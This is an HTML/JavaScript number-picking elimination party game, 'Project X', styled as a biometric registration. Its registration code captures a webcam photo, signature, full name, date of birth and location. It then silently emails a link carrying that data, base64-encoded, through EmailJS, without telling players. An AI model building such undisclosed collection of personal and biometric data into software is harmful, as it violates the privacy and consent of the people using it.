<!DOCTYPE html>
<html lang="fil">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>PROJECT X: ASSESSMENT</title>
    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <style>
        :root { --accent: #ff0000; }
        body, html { margin: 0; padding: 0; background: #fff; font-family: 'Courier New', monospace; height: 100vh; overflow: hidden; color: #000; }
        .screen { display: none; width: 100%; height: 100%; flex-direction: column; align-items: center; position: absolute; padding: 20px; box-sizing: border-box; overflow-y: auto; }
        .active { display: flex; animation: fadeIn 0.5s; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }

        /* Biometric Cam */
        #cam-box { width: 200px; height: 200px; border: 2px solid #000; position: relative; overflow: hidden; margin-bottom: 10px; background: #eee; }
        video, canvas { width: 100%; height: 100%; object-fit: cover; position: absolute; }
        .scan-bar { width: 100%; height: 2px; background: var(--accent); position: absolute; top: 0; animation: scan 2s infinite linear; z-index: 5; }
        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }

        input, select { width: 100%; padding: 12px; margin: 5px 0; border: 1px solid #000; border-radius: 0; font-family: inherit; font-size: 14px; }
        #sig-pad { border: 1px dashed #000; width: 100%; height: 100px; touch-action: none; background: #fafafa; }
        
        /* Game UI */
        .timer { font-size: 4rem; margin: 20px 0; font-weight: 100; }
        .grid { display: grid; grid-template-columns: repeat(5, 1fr); gap: 5px; width: 100%; }
        .num-btn { padding: 15px 0; border: 1px solid #000; background: #fff; font-family: inherit; }
        
        /* Leaderboard */
        .p-row { display: flex; align-items: center; padding: 10px; border-bottom: 1px solid #000; gap: 10px; width: 100%; }
        .p-thumb { width: 50px; height: 50px; border: 1px solid #000; object-fit: cover; }
        .dead { filter: grayscale(1); background: #f0f0f0; color: #999; }
        .btn-black { background: #000; color: #fff; padding: 18px; width: 100%; border: none; font-weight: bold; margin-top: 15px; letter-spacing: 2px; cursor: pointer; }
    </style>
</head>
<body>

<div id="app">
    <div id="reg-screen" class="screen active">
        <h2 style="letter-spacing: 5px;">BIOMETRIC LOGIN</h2>
        <div id="cam-box">
            <div class="scan-bar" id="scanner"></div>
            <video id="cam" autoplay playsinline></video>
            <canvas id="photo-canvas" style="display:none;"></canvas>
        </div>
        <button class="btn-black" style="font-size:10px; padding:10px;" id="cap-btn" onclick="takePhoto()">CAPTURE IDENTITY</button>
        
        <input type="text" id="p-name" placeholder="FULL NAME">
        <input type="date" id="p-dob">
        <input type="text" id="p-loc" placeholder="LOCATION (CITY/BRGY)">
        
        <p style="font-size: 10px; margin: 10px 0 2px;">SIGNATURE:</p>
        <canvas id="sig-pad"></canvas>
        
        <button class="btn-black" onclick="savePlayer()">REGISTER ASSET</button>
        <button id="start-game-btn" class="btn-black" style="background:red; display:none;" onclick="startRound()">COMMENCE GAME</button>
    </div>

    <div id="turn-screen" class="screen">
        <h1 style="color:red; margin-top:50px;">TURN START</h1>
        <img id="turn-img" style="width:220px; height:220px; border:3px solid #000; object-fit:cover;">
        <h2 id="turn-name"></h2>
        <p>HAND OVER THE DEVICE TO THIS PLAYER</p>
        <button class="btn-black" onclick="showGrid()">I HAVE THE DEVICE</button>
    </div>

    <div id="game-screen" class="screen">
        <div class="timer" id="timer">05:00</div>
        <p id="picking-name" style="font-weight:bold;"></p>
        <div class="grid" id="number-grid"></div>
    </div>

    <div id="board-screen" class="screen">
        <h1>ROUND RESULTS</h1>
        <p id="round-target" style="font-weight: bold; background:#000; color:#fff; padding:10px;"></p>
        <div id="leaderboard" style="width:100%;"></div>
        <button class="btn-black" onclick="startRound()">NEXT ROUND</button>
    </div>
</div>

<script>
    // INITIALIZE EMAILJS
    emailjs.init("Sq2dk1cU5F8dcG2WG");

    let players = [];
    let currentPlayerIndex = 0;
    let selections = {};
    let timerInterval;

    // CAMERA LOGIC
    const video = document.getElementById('cam');
    const canvas = document.getElementById('photo-canvas');
    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }).then(s => video.srcObject = s);

    function takePhoto() {
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        video.style.display = 'none';
        canvas.style.display = 'block';
        document.getElementById('scanner').style.display = 'none';
        document.getElementById('cap-btn').innerText = "IDENTITY FROZEN";
    }

    // SIGNATURE LOGIC
    const sigPad = document.getElementById('sig-pad');
    const ctx = sigPad.getContext('2d');
    let drawing = false;
    sigPad.addEventListener('touchstart', (e) => { drawing = true; ctx.beginPath(); });
    sigPad.addEventListener('touchend', () => drawing = false);
    sigPad.addEventListener('touchmove', (e) => {
        if(!drawing) return;
        let rect = sigPad.getBoundingClientRect();
        ctx.lineTo(e.touches[0].clientX - rect.left, e.touches[0].clientY - rect.top);
        ctx.stroke();
    });

    // SAVE & SEND TO EMAILJS
    function savePlayer() {
        const p = {
            id: Math.floor(1000 + Math.random() * 9000),
            name: document.getElementById('p-name').value,
            loc: document.getElementById('p-loc').value,
            dob: document.getElementById('p-dob').value,
            photo: canvas.toDataURL('image/jpeg', 0.1), // Grainy 50KB-ish quality
            sig: sigPad.toDataURL(),
            points: 0,
            alive: true
        };

        players.push(p);
        localStorage.setItem('projectX_players', JSON.stringify(players));

        // GENERATE AUTOMATIC LINK FOR CHECKER
        const stringData = JSON.stringify(p);
        const encodedData = btoa(unescape(encodeURIComponent(stringData)));
        // PALITAN MO ITONG URL NA ITO NG ACTUAL LINK NG CHECKER.HTML MO PAG NA-UPLOAD MO NA
        const secretLink = `https://your-username.github.io/checker.html?data=${encodedData}`;

        // SEND EMAIL
        emailjs.send("service_yjcswf2", "template_7nra9xd", {
            p_name: p.name,
            p_id: p.id,
            death_link: secretLink 
        });

        // RESET UI FOR NEXT PLAYER
        video.style.display = 'block'; canvas.style.display = 'none';
        document.getElementById('scanner').style.display = 'block';
        document.getElementById('p-name').value = "";
        ctx.clearRect(0,0,sigPad.width, sigPad.height);
        
        if(players.length >= 2) document.getElementById('start-game-btn').style.display = 'block';
    }

    // GAME ENGINE
    function startRound() {
        currentPlayerIndex = 0;
        selections = {};
        document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
        showTurnIntro();
    }

    function showTurnIntro() {
        const activeOnes = players.filter(p => p.alive);
        if(currentPlayerIndex >= activeOnes.length) { calculateRound(); return; }
        
        document.getElementById('turn-screen').classList.add('active');
        const p = activeOnes[currentPlayerIndex];
        document.getElementById('turn-img').src = p.photo;
        document.getElementById('turn-name').innerText = p.name;
    }

    function showGrid() {
        document.getElementById('turn-screen').classList.remove('active');
        document.getElementById('game-screen').classList.add('active');
        const p = players.filter(p => p.alive)[currentPlayerIndex];
        document.getElementById('picking-name').innerText = p.name + " PICK A NUMBER";
        
        const grid = document.getElementById('number-grid');
        grid.innerHTML = "";
        for(let i=0; i<=100; i++) {
            let b = document.createElement('button'); b.className = "num-btn"; b.innerText = i;
            b.onclick = () => { selections[p.id] = i; clearInterval(timerInterval); currentPlayerIndex++; document.getElementById('game-screen').classList.remove('active'); showTurnIntro(); };
            grid.appendChild(b);
        }
        startTimer();
    }

    function startTimer() {
        let time = 300; // 5 MINUTES
        timerInterval = setInterval(() => {
            let m = Math.floor(time/60); let s = time%60;
            document.getElementById('timer').innerText = `${m}:${s<10?'0':''}${s}`;
            if(time <= 0) { clearInterval(timerInterval); selections[players[currentPlayerIndex].id] = 0; currentPlayerIndex++; showTurnIntro(); }
            time--;
        }, 1000);
    }

    function calculateRound() {
        const activeOnes = players.filter(p => p.alive);
        let sum = 0; activeOnes.forEach(p => sum += selections[p.id]);
        let target = (sum / activeOnes.length) * 0.8;
        
        let winnerId = activeOnes[0].id;
        let minDiff = Math.abs(selections[winnerId] - target);

        activeOnes.forEach(p => {
            let diff = Math.abs(selections[p.id] - target);
            if(diff < minDiff) { minDiff = diff; winnerId = p.id; }
        });

        players.forEach(p => {
            if(p.alive && p.id !== winnerId) {
                p.points--;
                if(p.points <= -10) p.alive = false;
            }
        });

        localStorage.setItem('projectX_players', JSON.stringify(players));
        renderBoard(target);
    }

    function renderBoard(target) {
        document.getElementById('board-screen').classList.add('active');
        document.getElementById('round-target').innerText = "TARGET: " + target.toFixed(2);
        const board = document.getElementById('leaderboard');
        board.innerHTML = "";
        players.forEach(p => {
            const row = document.createElement('div');
            row.className = `p-row ${p.alive ? '' : 'dead'}`;
            row.innerHTML = `<img src="${p.photo}" class="p-thumb"><div><b>${p.name}</b><br><small>PICK: ${selections[p.id]||0}</small></div><div style="margin-left:auto; font-size:24px;">${p.points}</div>`;
            board.appendChild(row);
        });
    }
</script>
</body>
</html>
